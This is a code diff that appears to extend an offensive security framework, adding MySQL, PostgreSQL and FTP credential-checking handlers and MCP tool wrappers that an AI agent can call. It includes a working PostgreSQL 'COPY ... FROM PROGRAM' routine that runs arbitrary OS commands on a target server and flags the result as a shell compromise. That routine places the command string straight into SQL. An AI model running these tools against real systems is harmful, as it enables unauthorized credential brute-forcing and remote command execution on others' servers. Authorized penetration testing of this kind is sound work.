@@ -141,6 +141,158 @@ async def _winrm_handler(
         return {"facts": [], "raw_output": f"WinRM connection error: {target}:{port} — {exc}"}
 
 
+@_register("mysql")
+async def _mysql_handler(
+    target: str, username: str, password: str, port: int, timeout: int,
+) -> dict:
+    import pymysql
+
+    try:
+        conn = pymysql.connect(
+            host=target, port=port, user=username, password=password,
+            connect_timeout=timeout,
+        )
+        cursor = conn.cursor()
+        cursor.execute("SELECT VERSION(), CURRENT_USER()")
+        version, current_user = cursor.fetchone()
+        conn.close()
+        return {
+            "facts": [{
+                "trait": "credential.mysql",
+                "value": f"{username}:{password}@{target}:{port} (version: {version}, user: {current_user})",
+            }],
+            "raw_output": f"MySQL auth success: {username}@{target}:{port} — {current_user}",
+        }
+    except pymysql.err.OperationalError as exc:
+        return {"facts": [], "raw_output": f"MySQL auth_failure: {username}@{target}:{port} — {exc}"}
+    except Exception as exc:
+        return {"facts": [], "raw_output": f"MySQL connection error: {target}:{port} — {exc}"}
+
+
+@_register("postgresql")
+async def _postgresql_handler(
+    target: str, username: str, password: str, port: int, timeout: int,
+) -> dict:
+    import psycopg2
+
+    try:
+        conn = psycopg2.connect(
+            host=target, port=port, user=username, password=password,
+            connect_timeout=timeout,
+        )
+        cursor = conn.cursor()
+        cursor.execute("SELECT version(), current_user")
+        version, current_user = cursor.fetchone()
+        conn.close()
+        return {
+            "facts": [{
+                "trait": "credential.postgresql",
+                "value": f"{username}:{password}@{target}:{port} (version: {version[:60]}, user: {current_user})",
+            }],
+            "raw_output": f"PostgreSQL auth success: {username}@{target}:{port} — {current_user}",
+        }
+    except psycopg2.OperationalError as exc:
+        msg = str(exc).split("\n")[0]
+        return {"facts": [], "raw_output": f"PostgreSQL auth_failure: {username}@{target}:{port} — {msg}"}
+    except Exception as exc:
+        return {"facts": [], "raw_output": f"PostgreSQL connection error: {target}:{port} — {exc}"}
+
+
+async def _postgresql_exec(
+    target: str, username: str, password: str, port: int, timeout: int,
+    command: str = "id",
+) -> dict:
+    """Attempt OS command execution via PostgreSQL COPY ... TO PROGRAM.
+
+    Requires superuser privilege. Falls back to 'whoami' if 'id' returns empty.
+    Returns credential.shell fact on success (triggers compromise gate).
+    """
+    import psycopg2
+    import tempfile
+    import os
+
+    try:
+        conn = psycopg2.connect(
+            host=target, port=port, user=username, password=password,
+            connect_timeout=timeout,
+        )
+        conn.autocommit = True
+        cursor = conn.cursor()
+
+        # Create temp table, use COPY TO PROGRAM to capture output
+        cursor.execute("CREATE TEMP TABLE _athena_exec (line TEXT)")
+        cursor.execute(
+            f"COPY _athena_exec FROM PROGRAM '{command}'"
+        )
+        cursor.execute("SELECT string_agg(line, E'\\n') FROM _athena_exec")
+        row = cursor.fetchone()
+        output = (row[0] or "").strip() if row else ""
+
+        # Fallback: if 'id' returned empty, try 'whoami'
+        if not output and command == "id":
+            cursor.execute("TRUNCATE _athena_exec")
+            cursor.execute("COPY _athena_exec FROM PROGRAM 'whoami'")
+            cursor.execute("SELECT string_agg(line, E'\\n') FROM _athena_exec")
+            row = cursor.fetchone()
+            output = (row[0] or "").strip() if row else ""
+
+        cursor.execute("DROP TABLE IF EXISTS _athena_exec")
+        conn.close()
+
+        if output:
+            return {
+                "facts": [{
+                    "trait": "credential.shell",
+                    "value": f"postgresql_copy_exec:{username}:{password}@{target}:{port} ({output})",
+                }],
+                "raw_output": f"PostgreSQL COPY TO PROGRAM success: {command} → {output}",
+            }
+        return {"facts": [], "raw_output": f"PostgreSQL COPY TO PROGRAM: command returned empty output"}
+
+    except psycopg2.errors.InsufficientPrivilege:
+        return {"facts": [], "raw_output": f"PostgreSQL COPY TO PROGRAM denied: must be superuser"}
+    except psycopg2.OperationalError as exc:
+        msg = str(exc).split("\n")[0]
+        return {"facts": [], "raw_output": f"PostgreSQL exec auth_failure: {username}@{target}:{port} — {msg}"}
+    except Exception as exc:
+        return {"facts": [], "raw_output": f"PostgreSQL exec error: {target}:{port} — {exc}"}
+
+
+@_register("ftp")
+async def _ftp_handler(
+    target: str, username: str, password: str, port: int, timeout: int,
+) -> dict:
+    from ftplib import FTP, error_perm
+
+    loop = asyncio.get_running_loop()
+
+    def _check():
+        ftp = FTP()
+        ftp.connect(target, port, timeout=timeout)
+        ftp.login(username, password)
+        syst = ftp.sendcmd("SYST")
+        ftp.quit()
+        return syst
+
+    try:
+        syst = await asyncio.wait_for(
+            loop.run_in_executor(None, _check), timeout=timeout + 5,
+        )
+        return {
+            "facts": [{
+                "trait": "credential.ftp",
+                "value": f"{username}:{password}@{target}:{port} (syst: {syst})",
+            }],
+            "raw_output": f"FTP auth success: {username}@{target}:{port} — {syst}",
+        }
+    except error_perm:
+        return {"facts": [], "raw_output": f"FTP auth_failure: {username}@{target}:{port}"}
+    except asyncio.TimeoutError:
+        return {"facts": [], "raw_output": f"FTP timeout: {target}:{port}"}
+    except Exception as exc:
+        return {"facts": [], "raw_output": f"FTP connection error: {target}:{port} — {exc}"}
+
+
 # ---------------------------------------------------------------------------
 # MCP tool wrappers (thin — one line each)
 # ---------------------------------------------------------------------------
@@ -200,6 +352,88 @@ async def winrm_credential_check(
         JSON with facts: credential.winrm if successful, empty if auth fails.
     """
     return json.dumps(await _check_credential("winrm", target, username, password, port, timeout))
+
+
+@mcp.tool()
+async def mysql_credential_check(
+    target: str, username: str, password: str, port: int = 3306, timeout: int = 10,
+) -> str:
+    """Test MySQL credentials against a target host.
+
+    Args:
+        target: Target IP address or hostname.
+        username: MySQL username to test.
+        password: MySQL password to test.
+        port: MySQL port (default 3306).
+        timeout: Connection timeout in seconds.
+
+    Returns:
+        JSON with facts: credential.mysql if successful, empty if auth fails.
+    """
+    return json.dumps(await _check_credential("mysql", target, username, password, port, timeout))
+
+
+@mcp.tool()
+async def postgresql_credential_check(
+    target: str, username: str, password: str, port: int = 5432, timeout: int = 10,
+) -> str:
+    """Test PostgreSQL credentials against a target host.
+
+    Args:
+        target: Target IP address or hostname.
+        username: PostgreSQL username to test.
+        password: PostgreSQL password to test.
+        port: PostgreSQL port (default 5432).
+        timeout: Connection timeout in seconds.
+
+    Returns:
+        JSON with facts: credential.postgresql if successful, empty if auth fails.
+    """
+    return json.dumps(await _check_credential("postgresql", target, username, password, port, timeout))
+
+
+@mcp.tool()
+async def ftp_credential_check(
+    target: str, username: str, password: str, port: int = 21, timeout: int = 10,
+) -> str:
+    """Test FTP credentials against a target host.
+
+    Args:
+        target: Target IP address or hostname.
+        username: FTP username to test (use 'anonymous' for anonymous login).
+        password: FTP password to test (empty string for anonymous).
+        port: FTP port (default 21).
+        timeout: Connection timeout in seconds.
+
+    Returns:
+        JSON with facts: credential.ftp if successful, empty if auth fails.
+    """
+    return json.dumps(await _check_credential("ftp", target, username, password, port, timeout))
+
+
+@mcp.tool()
+async def postgresql_exec_check(
+    target: str, username: str, password: str, port: int = 5432,
+    command: str = "id", timeout: int = 10,
+) -> str:
+    """Test OS command execution via PostgreSQL COPY TO PROGRAM (SPEC-057).
+
+    Requires PostgreSQL superuser privilege. Attempts to execute an OS
+    command through COPY ... FROM PROGRAM. On success, returns a
+    credential.shell fact that triggers the compromise gate.
+
+    Args:
+        target: Target IP address or hostname.
+        username: PostgreSQL username (must be superuser for COPY TO PROGRAM).
+        password: PostgreSQL password.
+        port: PostgreSQL port (default 5432).
+        command: OS command to execute (default 'id').
+        timeout: Connection timeout in seconds.
+
+    Returns:
+        JSON with facts: credential.shell if COPY TO PROGRAM succeeds.
+    """
+    return json.dumps(await _postgresql_exec(target, username, password, port, timeout, command))
 
 
 if __name__ == "__main__":
